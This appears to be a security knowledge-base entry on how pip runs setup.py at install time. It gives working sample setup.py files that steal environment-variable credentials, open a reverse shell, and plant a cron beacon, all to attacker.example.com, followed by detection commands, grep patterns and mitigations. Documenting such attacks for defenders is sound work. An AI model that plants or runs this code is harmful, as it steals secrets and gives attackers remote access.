---
name: "setup.py Arbitrary Code Execution"
packageManager: "pip"
slug: "pip-setup-py-execution"
category: "Code Execution"
severity: "critical"
platform:
  - "Linux"
  - "macOS"
  - "Windows"
description: "When a package is installed via `pip install`, pip executes the package's setup.py file using the installing user's privileges. This allows an attacker to embed arbitrary Python code in setup.py that runs automatically during installation, with no sandboxing or isolation. The executed code has full access to the filesystem, environment variables, network, and any resources available to the user running pip. This is one of the most fundamental and widely exploited attack vectors in the Python packaging ecosystem."
prerequisites:
  - "Victim installs a malicious package via pip (either from PyPI or a direct source)"
  - "pip is configured to build packages from source (default behavior for packages without wheels)"
  - "No network egress filtering or endpoint detection in place"
attackScenarios:
  - title: "Environment Variable Exfiltration via setup.py"
    description: "An attacker publishes a package with a setup.py that collects sensitive environment variables (API keys, cloud credentials, CI/CD tokens) and exfiltrates them to an attacker-controlled server during installation."
    commands:
      - label: "Malicious setup.py that exfiltrates environment variables"
        code: |
          # setup.py
          import os
          import json
          import urllib.request

          # Collect sensitive environment variables
          sensitive_vars = {}
          targets = [
              "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
              "GITHUB_TOKEN", "GITLAB_TOKEN", "NPM_TOKEN",
              "DATABASE_URL", "SECRET_KEY", "API_KEY",
              "CI", "JENKINS_URL", "TRAVIS", "CIRCLECI",
          ]
          for var in targets:
              val = os.environ.get(var)
              if val:
                  sensitive_vars[var] = val

          # Exfiltrate via HTTP POST
          data = json.dumps({
              "hostname": os.uname().nodename if hasattr(os, "uname") else os.environ.get("COMPUTERNAME", "unknown"),
              "user": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
              "cwd": os.getcwd(),
              "env": sensitive_vars,
          }).encode()

          try:
              req = urllib.request.Request(
                  "https://attacker.example.com/collect",
                  data=data,
                  headers={"Content-Type": "application/json"},
              )
              urllib.request.urlopen(req, timeout=5)
          except Exception:
              pass

          # Proceed with normal setup so the install appears to succeed
          from setuptools import setup
          setup(
              name="legitimate-looking-package",
              version="1.0.0",
              description="A helpful utility library",
              py_modules=["legitimate_module"],
          )
        language: "python"
  - title: "Reverse Shell via setup.py"
    description: "An attacker embeds a reverse shell payload in setup.py that connects back to an attacker-controlled host, providing interactive shell access to the victim's machine during package installation. Note: this reverse shell example uses os.dup2() and /bin/sh, which are Linux/macOS specific and will not work on Windows."
    commands:
      - label: "setup.py with embedded reverse shell"
        code: |
          # setup.py
          import os
          import socket
          import subprocess
          import threading

          def reverse_shell():
              try:
                  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  s.connect(("attacker.example.com", 4444))
                  os.dup2(s.fileno(), 0)
                  os.dup2(s.fileno(), 1)
                  os.dup2(s.fileno(), 2)
                  subprocess.call(["/bin/sh", "-i"])
              except Exception:
                  pass

          # Run in background thread so installation continues
          t = threading.Thread(target=reverse_shell, daemon=True)
          t.start()

          from setuptools import setup
          setup(
              name="helpful-utils",
              version="2.1.0",
          )
        language: "python"
  - title: "Overriding the install class for persistent backdoor"
    description: "The attacker overrides the setuptools install command class to inject a backdoor that persists on the system after installation completes, such as writing a cron job or scheduled task."
    commands:
      - label: "setup.py with install class override deploying persistence"
        code: |
          # setup.py
          from setuptools import setup
          from setuptools.command.install import install
          import os
          import platform

          class MaliciousInstall(install):
              def run(self):
                  # Deploy persistence mechanism
                  if platform.system() == "Linux":
                      cron_entry = "* * * * * curl https://attacker.example.com/beacon?h=$(hostname)\n"
                      cron_file = os.path.expanduser("~/.cron_update")
                      with open(cron_file, "w") as f:
                          f.write(cron_entry)
                      os.system(f"crontab {cron_file}")
                      os.remove(cron_file)

                  # Run normal install so nothing looks wrong
                  install.run(self)

          setup(
              name="data-helpers",
              version="1.0.0",
              cmdclass={"install": MaliciousInstall},
          )
        language: "python"
detection:
  - title: "Download and inspect packages before installing"
    description: "Use pip download to fetch the package without executing it, then manually review setup.py and any build scripts for suspicious code such as network calls, os.system invocations, subprocess usage, or environment variable access."
    commands:
      - code: |
          # Download without installing
          pip download --no-deps --no-binary :all: <package-name> -d /tmp/inspect

          # Extract and review
          cd /tmp/inspect
          tar xzf *.tar.gz || unzip *.whl
          cat */setup.py

          # Search for suspicious patterns
          grep -rn "os.system\|subprocess\|urllib\|socket\|exec(\|eval(" */setup.py
        language: "bash"
  - title: "Prefer packages with pyproject.toml and pre-built wheels"
    description: "Modern Python packages use pyproject.toml with declarative metadata that does not execute arbitrary code. Installing pre-built wheels (.whl) also avoids setup.py execution entirely."
    commands:
      - code: |
          # Install only pre-built wheels, never source distributions
          pip install --only-binary :all: <package-name>

          # Check whether a package is available as a wheel (safe) or only as sdist (setup.py will execute)
          pip download --no-deps --only-binary :all: <package-name> 2>&1 || echo "No wheel available - sdist only (setup.py will execute)"
        language: "bash"
  - title: "Monitor network activity during pip install"
    description: "Use network monitoring tools to detect unexpected outbound connections during package installation, which may indicate data exfiltration or C2 communication."
    commands:
      - code: |
          # Linux: monitor network connections during install
          strace -e trace=network -f pip install <package-name> 2>&1 | grep connect

          # macOS: use dtrace or nettop
          sudo dtrace -n 'syscall::connect:entry /execname == "python3"/ { trace(arg0); }' &
          pip install <package-name>
        language: "bash"
mitigation:
  - "Use --only-binary :all: flag with pip to install pre-built wheels and avoid executing setup.py"
  - "Prefer packages that use PEP 517/518 build systems (pyproject.toml) over legacy setup.py"
  - "Run pip install in isolated environments (containers, VMs, or sandboxed CI/CD runners)"
  - "Implement network egress filtering to block unexpected outbound connections during builds"
  - "Use pip's --require-hashes flag to verify package integrity against known-good hashes"
  - "Audit new and updated dependencies before installation using tools like pip-audit or safety"
  - "Use a private package index with curated and vetted packages"
references:
  - title: "Python Packaging User Guide - setup.py"
    url: "https://packaging.python.org/en/latest/guides/distributing-packages-using-setuptools/"
  - title: "PEP 517 - A build-system independent format for source trees"
    url: "https://peps.python.org/pep-0517/"
  - title: "PyPI Under Attack - Project Creation and User Registration Suspended"
    url: "https://checkmarx.com/blog/pypi-is-under-attack-project-creation-and-user-registration-suspended/"
  - title: "pip documentation - Installation"
    url: "https://pip.pypa.io/en/stable/cli/pip_install/"
created: 2026-04-02
updated: 2026-04-02
---
